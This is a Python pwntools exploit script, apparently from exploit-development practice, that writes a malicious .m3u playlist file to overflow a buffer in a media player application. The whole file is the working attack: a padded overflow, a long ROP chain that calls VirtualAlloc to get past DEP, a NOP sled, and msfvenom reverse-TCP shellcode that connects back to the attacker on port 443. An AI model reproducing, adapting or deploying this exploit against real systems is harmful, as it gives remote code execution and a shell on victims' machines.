#!/usr/bin/env python3
from pwn import *

total_buffer = 30000
offset = 26102

# VirtualAlloc IAT Addr -> 0x10032078

va =  p32(0x45454545)                                            # VirtualAlloc IAT Addr - 0x10032078
va += p32(0x46464646)                                            # Shellcode Return Addr
va += p32(0x47474747)                                            # lpAddr
va += p32(0x48484848)                                            # dwSize (0x1) - Shellcode size does not really matter when sc size > 0x1000 bytes
va += p32(0x49494949)                                            # flAllocationType (0x1000 => MEM_COMMIT)
va += p32(0x50505050)                                            # flProtect (0x40 => PAGE_EXECUTE_READWRITE)

# Save ESP register in ESI
ropc  = p32(0x1002e892)                                          # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret
ropc += b"D" * 4                                                 # Stack alignment for POP instructions
# Move ESP value into EAX in order to get 0x45454545 dummy value
ropc += p32(0x10024bfe)                                          # mov eax, esi ; pop ecx ; pop esi ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xffffffe0)                                          # -0x20
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions

# VirtualAlloc addr from IAT => 0x10032078
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0x10032078)                                          # VirtualAlloc memory addr from IAT
ropc += p32(0x10028844)                                          # mov eax, dword [edx+0x04] ; ret
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xffffd0d0)                                          # -0x2f30
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x1001fcda)                                          # mov dword [edi], eax ; mov eax, esi ; pop edi ; pop esi ; pop ebp ; ret
ropc += b"D" * 12                                                # Stack alignment for POP instructions

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee03ac)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret

# Get EAX - 78 => 0x46464646 
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xffffff88)                                          # -0x78
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
# Save the dummy value memory address to EDI
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xfffffdf4)                                          # ? 0x0 - (0x120 + 0xec)
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
ropc += p32(0x1001fcda)                                          # mov dword [edi], eax ; mov eax, esi ; pop edi ; pop esi ; pop ebp ; ret
ropc += b"D" * 12                                                # Stack alignment for POP instructions

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee0374)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
# Save the dummy value memory address to EDI
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xffffff54)                                          # -0xac
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions
# Get the Shellcode return addr and change the Memory address of EDI points to (0x47474747)
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xfffffdf8)                                          # ? 0x0 - (0x11c + 0xec)
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
ropc += p32(0x1001fcda)                                          # mov dword [edi], eax ; mov eax, esi ; pop edi ; pop esi ; pop ebp ; ret
ropc += b"D" * 12                                                # Stack alignment for POP instructions

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee0330)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
# Save the dummy value memory address to EDI
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xffffff14)                                          # -0xec
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions
# Add 2 big values to get 0x1 and load it to memory addres EDI points to (0x48484848)
ropc += p32(0x10028869)                                          # pop edx ; ret
ropc += p32(0x70707070)                                          # First value to be added
ropc += p32(0x10011925)                                          # pop ebx ; ret
ropc += p32(0x8f8f8f91)                                          # Second value to be added
ropc += p32(0x10024ece)                                          # add edx, ebx ; pop ebx ; retn 0x0010
ropc += b"D" * 4                                                 # Stack alignment for POP Instructions
ropc += p32(0x1002994a)                                          # mov dword [edi], edx ; mov eax, dword [esp+0x08] ; pop edi ; ret
ropc += b"D" * 0x14                                              # Stack alignment for retn 0x0010

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee02d8)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
# Save the dummy value memory address (0x49494949) to EDI
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xfffffec0)                                          # -0x140
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions
# Get MEM_COMMIT to 0x49494949
ropc += p32(0x10026d56)                                          # pop eax; ret
ropc += p32(0xffffefff)                                          # -0x1001
ropc += p32(0x10011803)                                          # inc eax ; ret
ropc += p32(0x1001e7b4)                                          # neg eax ; pop ebx ; ret
ropc += b"D" * 4                                                 # Stack alignment for POP instructions
ropc += p32(0x1001fcda)                                          # mov dword [edi], eax ; mov eax, esi ; pop edi ; pop esi ; pop ebp ; ret
ropc += b"D" * 12                                                # Stack alignment for POP instructions

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee029c)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
# Save the dummy value memory address (0x50505050) to EDI
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xfffffe88)                                          # -0x178
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
ropc += p32(0x100128f7)                                          # push eax ; pop edi ; pop esi ; pop ebx ; ret
ropc += b"D" * 8                                                 # Stack alignment for POP instructions

ropc += p32(0x10026d56)                                          # pop eax; ret
ropc += p32(0xffffffc0)                                          # -0x40
ropc += p32(0x1001e7b4)                                          # neg eax ; pop ebx ; ret
ropc += b"D" * 4                                                 # Stack alignment for POP instructions
ropc += p32(0x1001fcda)                                          # mov dword [edi], eax ; mov eax, esi ; pop edi ; pop esi ; pop ebp ; ret
ropc += b"D" * 12                                                # Stack alignment for POP instructions

# Get the current Stack Value into EAX
ropc += p32(0x1002c323)                                          # xor eax, eax ; ret
ropc += p32(0x10014177)                                          # pop ecx ; ret
ropc += p32(0xffee0254)                                          # ? 0x0 - esp
ropc += p32(0x10027da4)                                          # sub eax, ecx ; ret
# Get the addr of VirtualAlloc to EAX
ropc += p32(0x1002d6cc)                                          # pop edx ; ret
ropc += p32(0xfffffe28)                                          # -0x1d8
ropc += p32(0x1001741e)                                          # add eax, edx ; ret
# Mov EAX value to a register that will allow modifying the ESP
ropc += p32(0x1001e71d)                                          # xchg eax, ebp ; ret
ropc += p32(0x100252cc)                                          # mov esp, ebp ; pop ebp ; ret
ropc += b"D" * 4                                                 # Stack alignment for POP instructions

# msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=443 -b "\x00\x09\x0a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbd\xb9\xa9\xd1\xdf\xda\xc3\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc"
shellcode += b"\x03\xd3\xa7\x33\x2a\xdf\x50\x31\xd5\x1f\xa1"
shellcode += b"\x56\x5f\xfa\x90\x56\x3b\x8f\x83\x66\x4f\xdd"
shellcode += b"\x2f\x0c\x1d\xf5\xa4\x60\x8a\xfa\x0d\xce\xec"
shellcode += b"\x35\x8d\x63\xcc\x54\x0d\x7e\x01\xb6\x2c\xb1"
shellcode += b"\x54\xb7\x69\xac\x95\xe5\x22\xba\x08\x19\x46"
shellcode += b"\xf6\x90\x92\x14\x16\x91\x47\xec\x19\xb0\xd6"
shellcode += b"\x66\x40\x12\xd9\xab\xf8\x1b\xc1\xa8\xc5\xd2"
shellcode += b"\x7a\x1a\xb1\xe4\xaa\x52\x3a\x4a\x93\x5a\xc9"
shellcode += b"\x92\xd4\x5d\x32\xe1\x2c\x9e\xcf\xf2\xeb\xdc"
shellcode += b"\x0b\x76\xef\x47\xdf\x20\xcb\x76\x0c\xb6\x98"
shellcode += b"\x75\xf9\xbc\xc6\x99\xfc\x11\x7d\xa5\x75\x94"
shellcode += b"\x51\x2f\xcd\xb3\x75\x6b\x95\xda\x2c\xd1\x78"
shellcode += b"\xe2\x2e\xba\x25\x46\x25\x57\x31\xfb\x64\x30"
shellcode += b"\xf6\x36\x96\xc0\x90\x41\xe5\xf2\x3f\xfa\x61"
shellcode += b"\xbf\xc8\x24\x76\xc0\xe2\x91\xe8\x3f\x0d\xe2"
shellcode += b"\x21\x84\x59\xb2\x59\x2d\xe2\x59\x99\xd2\x37"
shellcode += b"\xcd\xc9\x7c\xe8\xae\xb9\x3c\x58\x47\xd3\xb2"
shellcode += b"\x87\x77\xdc\x18\xa0\x12\x27\xcb\x63\xf7\xcd"
shellcode += b"\x2e\x14\xfa\x11\x30\x5f\x73\xf7\x58\x8f\xd2"
shellcode += b"\xa0\xf4\x36\x7f\x3a\x64\xb6\x55\x47\xa6\x3c"
shellcode += b"\x5a\xb8\x69\xb5\x17\xaa\x1e\x35\x62\x90\x89"
shellcode += b"\x4a\x58\xbc\x56\xd8\x07\x3c\x10\xc1\x9f\x6b"
shellcode += b"\x75\x37\xd6\xf9\x6b\x6e\x40\x1f\x76\xf6\xab"
shellcode += b"\x9b\xad\xcb\x32\x22\x23\x77\x11\x34\xfd\x78"
shellcode += b"\x1d\x60\x51\x2f\xcb\xde\x17\x99\xbd\x88\xc1"
shellcode += b"\x76\x14\x5c\x97\xb4\xa7\x1a\x98\x90\x51\xc2"
shellcode += b"\x29\x4d\x24\xfd\x86\x19\xa0\x86\xfa\xb9\x4f"
shellcode += b"\x5d\xbf\xca\x05\xff\x96\x42\xc0\x6a\xab\x0e"
shellcode += b"\xf3\x41\xe8\x36\x70\x63\x91\xcc\x68\x06\x94"
shellcode += b"\x89\x2e\xfb\xe4\x82\xda\xfb\x5b\xa2\xce"

# Badchars \x09\x0a
payload = b"A" * (offset - len(va))                              # Offset to trigger the crush
payload += va
payload += ropc
payload += b"\x90" * 200
payload += shellcode
payload += b"C" * (total_buffer - len(payload))                  # Filler for rest of the stack

f=open("../Shared/depeasyrm.m3u", "wb")
f.write(payload)
f.close()
